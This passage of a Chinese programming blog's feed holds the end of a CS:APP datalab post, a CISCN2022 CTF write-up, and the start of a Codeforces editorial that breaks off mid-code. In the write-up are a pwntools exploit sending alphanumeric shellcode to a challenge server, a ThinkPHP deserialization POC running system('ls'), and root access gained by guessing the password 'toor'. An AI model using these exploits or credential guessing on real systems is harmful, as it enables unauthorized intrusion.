class="built_in">exp</span>=((uf&amp;<span class="number">0x7f800000</span>)&gt;&gt;<span class="number">23</span>)<span class="number">-127</span>;</span><br><span class="line"><span class="keyword">int</span> frac=(uf&amp;<span class="number">0x007fffff</span>)|<span class="number">0x00800000</span>;</span><br><span class="line"><span class="keyword">if</span>(!(uf&amp;<span class="number">0x7fffffff</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>&gt;<span class="number">31</span>)<span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>&gt;<span class="number">23</span>)frac&lt;&lt;=(<span class="built_in">exp</span><span class="number">-23</span>);</span><br><span class="line"><span class="keyword">else</span> frac&gt;&gt;=(<span class="number">23</span>-<span class="built_in">exp</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!((frac&gt;&gt;<span class="number">31</span>)^s)) <span class="keyword">return</span> frac;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(frac&gt;&gt;<span class="number">31</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> ~frac+<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现运算 <code>pow(2,x)</code>，返回结果为 <code>int</code> 虽然我们可以直接 <code>1&lt;&lt;x</code>，但是它要求浮点计算。</p><p>首先防止溢出先判断，因为是 <code>2</code> 的整数次方，所以它的结果就是 <code>(exp+127)&lt;&lt;23</code>，然后判断无穷小和溢出即可，这个比较简单。</p><h4 id="答案-10"><a href="#答案-10" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> INF = <span class="number">0xff</span>&lt;&lt;<span class="number">23</span>;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exp</span> = x + <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span> &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span> &gt;= <span class="number">255</span>) <span class="keyword">return</span> INF;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意，由于最后一个题目测试数据比较多，因此要修改时限才能通过。我也不知道我算法有什么问题，这 <code>O(1)</code> 的复杂度也不知道上哪优化去。</p><h3 id="result"><a href="#result" class="headerlink" title="result"></a>result</h3><p><img src="/2022/06/03/CSAPP_Datalab/6.png" alt="6"></p><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>啥也不说了 <code>CSAPP</code> 永远的神，入门二进制必备书籍，二刷都能感觉学到了很多以前没学到的东西，接下来没以前认真看的也都得去看一遍了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;之前 &lt;code&gt;CS:APP&lt;/code&gt; 没有好好学，今天下定决心来重新看一遍，并把实验好好做一遍以巩固自身。&lt;/p&gt;</summary>
    
    
    
    <category term="csapp" scheme="http://example.com/categories/csapp/"/>
    
    <category term="信息的表示处理" scheme="http://example.com/categories/csapp/%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%A4%84%E7%90%86/"/>
    
    
  </entry>
  
  <entry>
    <title>CISCN2022 初赛WP</title>
    <link href="http://example.com/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/"/>
    <id>http://example.com/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/</id>
    <published>2022-05-31T16:00:00.000Z</published>
    <updated>2022-06-01T15:05:44.604Z</updated>
    
    <content type="html"><![CDATA[<p>咕了有点久了，来发一下</p><span id="more"></span><h1 id="CISCN2022初赛WP"><a href="#CISCN2022初赛WP" class="headerlink" title="CISCN2022初赛WP"></a>CISCN2022初赛WP</h1><h2 id="一、-战队信息"><a href="#一、-战队信息" class="headerlink" title="一、 战队信息"></a>一、 战队信息</h2><p><strong>战队名称：flag虽不能至，然心向往之</strong></p><p><strong>战队排名：第130名</strong></p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/image-20220529204836288.png" alt="image-20220529204836288"></p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/image-20220529204847304.png" alt="image-20220529204847304"></p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/image-20220529204852556.png" alt="image-20220529204852556"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到电台"><a href="#签到电台" class="headerlink" title="签到电台"></a>签到电台</h3><p>根据题目的提示从公众号获取两个hint：</p><ol><li><p>在“标准电码表”找“弼时安全到达了”所对应的7个电码，再跟“密码本”的前7*4个数字分别逐位进行“模十算法”（加不进位、减不借位），所得到的就是要发送的电码。发送电码前先发送“s”启动，即按3个“.”，这个发送电报的过程可以使用抓包软件进行抓取，可方便输入电报。</p></li><li><p>“弼时安全到达了”所对应的7个电码：1732 2514 1344 0356 0451 6671 0055。模十算法示例：1732与6378得到7000，发包示例：/send?msg=s</p></li></ol><p>然后访问/secret看到密码，取前28个做模10运算，再用hint2的发包方式发送得到flag。</p><h3 id="基于挑战码的双向认证"><a href="#基于挑战码的双向认证" class="headerlink" title="基于挑战码的双向认证"></a>基于挑战码的双向认证</h3><p>这题给了 <code>ssh</code>，有权限就想着先连一下，连上去之后试试 <code>find / | grep &quot;flag.txt&quot; </code>找到一个类似 <code>flag</code>的东西，但是不是 <code>flag</code>，此时又看到两个题目是连着的，所以就猜测应该是 <code>flag1.txt</code> 和 <code>flag2.txt</code>。寻找之后发现 <code>/root/cube-shell/instance/flag_server/</code> 目录下存在，然后就直接拿到两个题目的 <code>flag</code> 了。</p><h3 id="基于挑战码的双向认证3"><a href="#基于挑战码的双向认证3" class="headerlink" title="基于挑战码的双向认证3"></a>基于挑战码的双向认证3</h3><p>有了前两道题目的铺垫之后，又试了试查看该目录下的 <code>flag</code> 发现权限不够，然后就尝试提权，直接试试看默认密码，随便输了几个试到了 <code>toor</code> 直接就提权了，然后拿下flag。</p><h3 id="ISO9798"><a href="#ISO9798" class="headerlink" title="ISO9798"></a>ISO9798</h3><p>链接靶机，有pow，爆破即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">hash</span>=<span class="string">&#x27;ed8e248b4ec6828ea8f2cda56293484cbff40d934aba1e641cc3fcbf94e1757c&#x27;</span></span><br><span class="line">sss=<span class="string">&#x27;Eee9sVQumMWXoLEL&#x27;</span></span><br><span class="line">table=<span class="string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ch1 <span class="keyword">in</span> table:</span><br><span class="line">    <span class="keyword">for</span> ch2 <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> ch3 <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> ch4 <span class="keyword">in</span> table:</span><br><span class="line">                hashvalue=sha256((ch1+ch2+ch3+ch4+sss).encode()).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> hashvalue==<span class="built_in">hash</span>:</span><br><span class="line">                    <span class="built_in">print</span>(ch1+ch2+ch3+ch4)</span><br><span class="line">                    quit()</span><br></pre></td></tr></table></figure><p>然后输入32个0过第二步</p><p>返回一长串字符串</p><p>4993ad5ec5dfd5147003438c0e6afd696b026f48fb9676d625dbb6e2b1536b803c4d2e0a001b998f0d6afcb063e71fd8</p><p><img src="file:///C:/Users/XIA0JI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="img">根据提示分成ra,rb,k</p><p>ra=4993ad5ec5dfd5147003438c0e6afd69</p><p>rb=6b026f48fb9676d625dbb6e2b1536b80</p><p>K=3c4d2e0a001b998f0d6afcb063e71fd8</p><p>然后组合一下rb+ra为</p><p>6b026f48fb9676d625dbb6e2b1536b804993ad5ec5dfd5147003438c0e6afd69</p><p>打入出flag</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>漏洞点在选项2，选项2用 <code>mmap</code> 开辟了一个可读可写可执行的内存，并可以往上面写东西，并且执行过去，那么就确定要在上面写 <code>shellcode</code>，但是之前有三个check，后两个经过交叉引用可知在选项 <code>1</code> 中给 <code>ro0t</code> 可以将它置为1，于是我们就先用选项 <code>1</code> 置为1，再用选项 <code>2</code> 去写 <code>shellcode</code>，但是每个字节都有 <code>isprint</code> 的 <code>check</code>，那好办，就直接写 <code>alphanumeric shellcode</code>。</p><p>在下面这个文章中找到用的shellcode </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/Y_peak/article/details/115307573</span><br></pre></td></tr></table></figure><p>然后写出exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io=process(&#x27;./login&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;101.201.123.35&#x27;</span>,<span class="number">27290</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;opt:1\r\nmsg:ro0t\r\n&#x27;</span>)</span><br><span class="line">code = <span class="string">b&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;opt:2\r\nmsg:&#x27;</span>+code+<span class="string">b&#x27;\r\n&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>TP的新链子，具体漏洞分析在这：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/vuls/321546.html</span><br></pre></td></tr></table></figure><p>下图可见在/index.php/Index/test POST传序列化字符串给a即可</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1.png" alt="1"></p><p>POC在此，ls一下再读下flag即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">lazySave</span> = <span class="title">false</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$json</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$jsonAssoc</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">True</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;ls&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="literal">True</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;json = [<span class="string">&#x27;whoami&#x27;</span>,[<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;jsonAssoc = <span class="literal">True</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span>(<span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>()))));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="baby-tree"><a href="#baby-tree" class="headerlink" title="baby_tree"></a>baby_tree</h3><p>直接看ast，assign_expr是赋值语句，binary_expr里面decl=后面是运算符，argument_list里的两个argument参与运算，分析一下主要逻辑，写出对应的解密脚本。</p><p>脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b[] = &#123;<span class="number">88</span>, <span class="number">35</span>, <span class="number">88</span>, <span class="number">225</span>, <span class="number">7</span>, <span class="number">201</span>, <span class="number">57</span>, <span class="number">94</span>, <span class="number">77</span>, <span class="number">56</span>, <span class="number">75</span>, <span class="number">168</span>, <span class="number">72</span>, <span class="number">218</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">16</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">207</span>, <span class="number">73</span>, <span class="number">130</span>, <span class="number">74</span>, <span class="number">128</span>, <span class="number">76</span>, <span class="number">201</span>, <span class="number">16</span>, <span class="number">248</span>, <span class="number">41</span>, <span class="number">205</span>, <span class="number">103</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">99</span>, <span class="number">79</span>, <span class="number">202</span>, <span class="number">22</span>, <span class="number">131</span>, <span class="number">63</span>, <span class="number">255</span>, <span class="number">20</span>, <span class="number">16</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> k[] = <span class="string">&quot;345y&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span> - <span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = k[<span class="number">0</span>];</span><br><span class="line">        k[<span class="number">0</span>] = k[<span class="number">1</span>];</span><br><span class="line">        k[<span class="number">1</span>] = k[<span class="number">2</span>];</span><br><span class="line">        k[<span class="number">2</span>] = k[<span class="number">3</span>];</span><br><span class="line">        k[<span class="number">3</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">42</span> - <span class="number">4</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> r0 = b[i + <span class="number">0</span>], r1 = b[i + <span class="number">1</span>], r2 = b[i + <span class="number">2</span>], r3 = b[i + <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = k[<span class="number">3</span>];</span><br><span class="line">        k[<span class="number">3</span>] = k[<span class="number">2</span>];</span><br><span class="line">        k[<span class="number">2</span>] = k[<span class="number">1</span>];</span><br><span class="line">        k[<span class="number">1</span>] = k[<span class="number">0</span>];</span><br><span class="line">        k[<span class="number">0</span>] = tmp;</span><br><span class="line">        b[i + <span class="number">0</span>] = r2 ^ k[<span class="number">2</span>];</span><br><span class="line">        b[i + <span class="number">1</span>] = r3 ^ k[<span class="number">3</span>];</span><br><span class="line">        b[i + <span class="number">2</span>] = ((k[<span class="number">0</span>] + (b[i + <span class="number">0</span>] &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0xff</span>) ^ r0;</span><br><span class="line">        b[i + <span class="number">3</span>] = ((k[<span class="number">1</span>] + (b[i + <span class="number">1</span>] &gt;&gt; <span class="number">2</span>)) &amp; <span class="number">0xff</span>) ^ r1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(b[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上面的程序拿到flag</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="everlasting-night"><a href="#everlasting-night" class="headerlink" title="everlasting_night"></a>everlasting_night</h3><p>本来以为不是lsb隐写（因为隐藏字母太小太犄角旮旯了没看见），查看属性无信息获取</p><p>拉入010editor中查看png的文件头和文件尾，发现文件尾后面有一段多出来的字符，不知道是做什么的，先放着</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653813046204.png" alt="1653813046204"></p><p>题目提示含lsb隐写后，拉入Stegsolve查看，终于在Alpha2处发现右下角有猫腻</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653821873989.png" alt="1653821873989"></p><p>但是分析并没有得出信息，坚信信息就隐藏在这里，查阅字典发现row译为中文是行，column是柱，猜测可能是因为右下角的信息是一列的，而我刚开始查看是以行查看，修改成功数据后发现隐藏文本</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653813260877.png" alt="1653813260877"></p><p>拿到这串数字后第一反应使用lsb的工具</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653824152028.png" alt="1653824152028"></p><p>拿到一个文本文件，拉入010查看发现是压缩包文件头，果断修改后缀名为rar</p><p>但是解压需要密码，猜测开头在文件尾后的那一串是密码，但是输入后发现不是，猜测可能是某种加密，广泛尝试后发现是md5隐写</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653817094602.png" alt="1653817094602">解压后得到一个没有后缀的flag文件</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653822607451.png" alt="1653822607451"></p><p>拉入010发现是PNG文件，本来想通过改后缀名拿到答案，后来发现还是太天真</p><p>使用ps和画图打开无果，想到gimp，将文件后缀名改为data后用gimp打开</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653824657534.png" alt="1653824657534"></p><p>发现图片有些怪怪的，本来想拼图找一下flag，但是实在考验眼力，于是尝试修改各种数值，发现猫腻出在宽度上</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653824747017.png" alt="1653824747017"></p><p>拿到答案，提交</p><h3 id="ez-usb"><a href="#ez-usb" class="headerlink" title="ez_usb"></a>ez_usb</h3><p>使用 wireshark 打开发现是 usb 键盘流量</p><p>有两个不同的 usb.addr 发送数据，分别将其保存到两个不同的流量包</p><p>用键盘流量分析工具对其提取数据：<a href="https://github.com/WangYihang/UsbKeyboardDataHacker">https://github.com/WangYihang/UsbKeyboardDataHacker</a></p><p>发现有一个 <code>rar</code> 文件，一个 <code>35c535765e50074a</code>，打开rar文件发现需要密码，应该另一串字符就是密码，输入成功拿到 <code>flag</code> 文件</p><h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p>填个问卷而已</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;咕了有点久了，来发一下&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="CISCN" scheme="http://example.com/categories/CTF/CISCN/"/>
    
    <category term="2022" scheme="http://example.com/categories/CTF/CISCN/2022/"/>
    
    
  </entry>
  
  <entry>
    <title>Educational Coeforces Round 129(Div.2)题解</title>
    <link href="http://example.com/2022/05/24/Educational%20Coeforces%20Round%20129(Div.2)/"/>
    <id>http://example.com/2022/05/24/Educational%20Coeforces%20Round%20129(Div.2)/</id>
    <published>2022-05-24T14:00:00.000Z</published>
    <updated>2022-05-24T14:58:19.117Z</updated>
    
    <content type="html"><![CDATA[<p>这波 <code>div2</code> 上大分，写波题解。</p><p>实况录屏<a href="https://www.bilibili.com/video/BV1RS4y1B7g3">在这</a></p><span id="more"></span><h2 id="A-Game-with-Cards"><a href="#A-Game-with-Cards" class="headerlink" title="A. Game with Cards"></a>A. Game with Cards</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/24/Educational%20Coeforces%20Round%20129(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目的意思就是说，<code>Alice</code> 和 <code>Bob</code> 分别有 <code>n,m</code> 张牌，然后每次出牌不能小于等于上一次的出牌，如果到自己的回合却不能出牌则判负，问如果两人分别先手，谁会赢？这个稍微想一下就能发现我一开始出最大的一定是最优的策略，比的就是最大值谁最大，假设相等那我肯定出最大的那个我必赢，所以无脑比最大就是这题的思路，如果相等那么谁先手谁赢，所以这里就分三种情况：</p><ol><li><code>max1&gt;max2</code>：<code>Alice</code>必赢</li><li><code>max1&lt;max2</code>：<code>Bob</code>必赢</li><li><code>max1==max2</code>：谁先手谁赢</li></ol><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> max1=<span class="number">0</span>,max2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        max1=<span class="built_in">max</span>(max1,x);</span><br><span class="line">    &#125;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        max2=<span class="built_in">max</span>(max2,x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(max1&gt;max2)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alice\nAlice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(max1&lt;max2)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Bob\nBob&quot;</span>);</span><br><span class="line">    